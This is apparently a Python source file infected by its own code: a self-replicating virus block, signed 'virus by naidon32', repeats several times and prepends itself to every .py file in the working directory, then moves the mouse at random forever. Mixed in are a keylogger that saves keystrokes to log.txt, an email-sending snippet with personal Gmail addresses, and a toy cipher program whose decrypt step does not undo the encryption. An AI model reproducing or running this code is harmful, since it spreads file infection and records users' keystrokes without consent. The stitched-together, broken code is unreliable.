from pynput.mouse import Button, Controller
import time
import random
import os

for root, dirs, files in os.walk(os.getcwd()):
	for f in files:
		if f.endswith('.py'):
			with open(f,'r+') as f:
				target_host_content = f.read()
				f.seek(0, 0)
				with open(__file__) as virus:
					virus_content = virus.read()
					f.write(virus_content + "\n" + target_host_content)
print("Hello World")



mous = Controller()
#keyb = Controller()

#virus by naidon32


time.sleep(5)
#with keyb.pressed(Key.cmd):
#    keyb.press('r')
#    keyb.release('r')
while True:
    try:
        chato = random.randint(100, 1000)
        chato1 = random.randint(50, 1000)
    except:
        pass
    else:
        time.sleep(5)
        mous.position = (chato, chato1)
        #mous.click(Button.left)





#keyb.press(Key.enter)
#keyb.release(Key.enter)
#keyb.type("pip install emoji")


from pynput.keyboard import Listener, Key



def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)





def monitor(key):
    try:
        log(key.char)
    except AttributeError:
        log(" <"+str(key)+"> ")
        

    


with Listener(on_release=monitor) as listener:
    listener.join()

from pynput.mouse import Button, Controller
import time
import random
import os

for root, dirs, files in os.walk(os.getcwd()):
	for f in files:
		if f.endswith('.py'):
			with open(f,'r+') as f:
				target_host_content = f.read()
				f.seek(0, 0)
				with open(__file__) as virus:
					virus_content = virus.read()
					f.write(virus_content + "\n" + target_host_content)
print("Hello World")



mous = Controller()
#keyb = Controller()

#virus by naidon32


time.sleep(5)
#with keyb.pressed(Key.cmd):
#    keyb.press('r')
#    keyb.release('r')
while True:
    try:
        chato = random.randint(100, 1000)
        chato1 = random.randint(50, 1000)
    except:
        pass
    else:
        time.sleep(5)
        mous.position = (chato, chato1)
        #mous.click(Button.left)





#keyb.press(Key.enter)
#keyb.release(Key.enter)
#keyb.type("pip install emoji")

import smtplib
from time import sleep
remitente = "<naidonjesus167@gmail.com"
destinatario = "anammarques0576@gmail.com"

assunto = "Enviando Email com python"
mansagem = """Ola Bom Dia<br><br>
Obrigado por desponibilizaro seu email<br><b>Naidon</b>
"""
email = """From: %s
To: %s
MIME-Version: 1.0
content-type: text/html
subject: %s

%s

"""

try:
	smtp = smtplib.SMTP('localhost')
	smtp.sendmail(remitente, destinatario, email)

except Exception as e:
	print("Não foi possivel enviar o email")
	sleep(3)
else:
	print("Correio enviado")
	sleep(3)

from pynput.mouse import Button, Controller
import time
import random
import os

for root, dirs, files in os.walk(os.getcwd()):
	for f in files:
		if f.endswith('.py'):
			with open(f,'r+') as f:
				target_host_content = f.read()
				f.seek(0, 0)
				with open(__file__) as virus:
					virus_content = virus.read()
					f.write(virus_content + "\n" + target_host_content)
print("Hello World")



mous = Controller()
#keyb = Controller()

#virus by naidon32


time.sleep(5)
#with keyb.pressed(Key.cmd):
#    keyb.press('r')
#    keyb.release('r')
while True:
    try:
        chato = random.randint(100, 1000)
        chato1 = random.randint(50, 1000)
    except:
        pass
    else:
        time.sleep(5)
        mous.position = (chato, chato1)
        #mous.click(Button.left)





#keyb.press(Key.enter)
#keyb.release(Key.enter)
#keyb.type("pip install emoji")


from pynput.keyboard import Listener, Key



def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)





def monitor(key):
    try:
        log(key.char)
    except AttributeError:
        log(" <"+str(key)+"> ")
        

    


with Listener(on_release=monitor) as listener:
    listener.join()

from pynput.mouse import Button, Controller
import time
import random
import os

for root, dirs, files in os.walk(os.getcwd()):
	for f in files:
		if f.endswith('.py'):
			with open(f,'r+') as f:
				target_host_content = f.read()
				f.seek(0, 0)
				with open(__file__) as virus:
					virus_content = virus.read()
					f.write(virus_content + "\n" + target_host_content)
print("Hello World")



mous = Controller()
#keyb = Controller()

#virus by naidon32


time.sleep(5)
#with keyb.pressed(Key.cmd):
#    keyb.press('r')
#    keyb.release('r')
while True:
    try:
        chato = random.randint(100, 1000)
        chato1 = random.randint(50, 1000)
    except:
        pass
    else:
        time.sleep(5)
        mous.position = (chato, chato1)
        #mous.click(Button.left)





#keyb.press(Key.enter)
#keyb.release(Key.enter)
#keyb.type("pip install emoji")

import smtplib
from time import sleep
remitente = "<naidonjesus167@gmail.com"
destinatario = "anammarques0576@gmail.com"

assunto = "Enviando Email com python"
mansagem = """Ola Bom Dia<br><br>
Obrigado por desponibilizaro seu email<br><b>Naidon</b>
"""
email = """From: %s
To: %s
MIME-Version: 1.0
content-type: text/html
subject: %s

%s

"""

try:
	smtp = smtplib.SMTP('localhost')
	smtp.sendmail(remitente, destinatario, email)

except Exception as e:
	print("Não foi possivel enviar o email")
	sleep(3)
else:
	print("Correio enviado")
	sleep(3)

from pynput.mouse import Button, Controller
import time
import random
import os

for root, dirs, files in os.walk(os.getcwd()):
	for f in files:
		if f.endswith('.py'):
			with open(f,'r+') as f:
				target_host_content = f.read()
				f.seek(0, 0)
				with open(__file__) as virus:
					virus_content = virus.read()
					f.write(virus_content + "\n" + target_host_content)
print("Hello World")



mous = Controller()
#keyb = Controller()

#virus by naidon32


time.sleep(5)
#with keyb.pressed(Key.cmd):
#    keyb.press('r')
#    keyb.release('r')
while True:
    try:
        chato = random.randint(100, 1000)
        chato1 = random.randint(50, 1000)
    except:
        pass
    else:
        time.sleep(5)
        mous.position = (chato, chato1)
        #mous.click(Button.left)





#keyb.press(Key.enter)
#keyb.release(Key.enter)
#keyb.type("pip install emoji")


from pynput.keyboard import Listener, Key



def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)





def monitor(key):
    try:
        log(key.char)
    except AttributeError:
        log(" <"+str(key)+"> ")
        

    


with Listener(on_release=monitor) as listener:
    listener.join()

from pynput.mouse import Button, Controller
import time
import random
import os

for root, dirs, files in os.walk(os.getcwd()):
	for f in files:
		if f.endswith('.py'):
			with open(f,'r+') as f:
				target_host_content = f.read()
				f.seek(0, 0)
				with open(__file__) as virus:
					virus_content = virus.read()
					f.write(virus_content + "\n" + target_host_content)
print("Hello World")



mous = Controller()
#keyb = Controller()

#virus by naidon32


time.sleep(5)
#with keyb.pressed(Key.cmd):
#    keyb.press('r')
#    keyb.release('r')
while True:
    try:
        chato = random.randint(100, 1000)
        chato1 = random.randint(50, 1000)
    except:
        pass
    else:
        time.sleep(5)
        mous.position = (chato, chato1)
        #mous.click(Button.left)





#keyb.press(Key.enter)
#keyb.release(Key.enter)
#keyb.type("pip install emoji")

import smtplib
from time import sleep
remitente = "<naidonjesus167@gmail.com"
destinatario = "anammarques0576@gmail.com"

assunto = "Enviando Email com python"
mansagem = """Ola Bom Dia<br><br>
Obrigado por desponibilizaro seu email<br><b>Naidon</b>
"""
email = """From: %s
To: %s
MIME-Version: 1.0
content-type: text/html
subject: %s

%s

"""

try:
	smtp = smtplib.SMTP('localhost')
	smtp.sendmail(remitente, destinatario, email)

except Exception as e:
	print("Não foi possivel enviar o email")
	sleep(3)
else:
	print("Correio enviado")
	sleep(3)

from time import sleep
from os import system

#import pygame

#pygame.init()



system("title criptografia de Cesar")

mensagem = str(input("Digite a mensagem: \033[32m"))


def cript(msg):
	s = ''
	for c in msg:
		s = s + chr(ord(c) + 30000)
		#while True:
		#	palavra = s
		#	tela = pygame.display.set_mode((600, 600))
		#	pygame.display.set_caption('criptografia de Cesar')
		#	font = pygame.font.SysFont('Lucida console', 20)
		#	label = font.render(f"Text Criptografado:{palavra}", 1, (0,0,0))
		#	for event in pygame.event.get():
		#		if event.type==pygame.QUIT:
		#			pygame.quit()
		#	tela.fill((255, 255, 255))
		#	tela.blit(label, (50,50))

		#	pygame.display.update()
	print(f"\n\033[32m {s}")

	



def decript(msg):
	s = ''
	for c in msg:
		s = s + chr(ord(c) + 0)
	
	print(f"\n\033[32m {s}")



while True:
	try:
		opc = int(input("\n\033[m===========>\033[32mMenu\033[m<===========\n1- criptografar\n2- Decriptografar\n3- Sair\n\nR: "))
	except:
		print("\033[31m|Opção errada|\033[m")
		sleep(3)
		system("cls")
	else:
		if opc == 1:

			cript(mensagem)
		elif opc == 2:
			decript(mensagem)
		elif opc == 3:
			sleep(2)
			break
		else:
			print("\033[31m|Opção errada|\033[m")
			sleep(3)
			system("cls")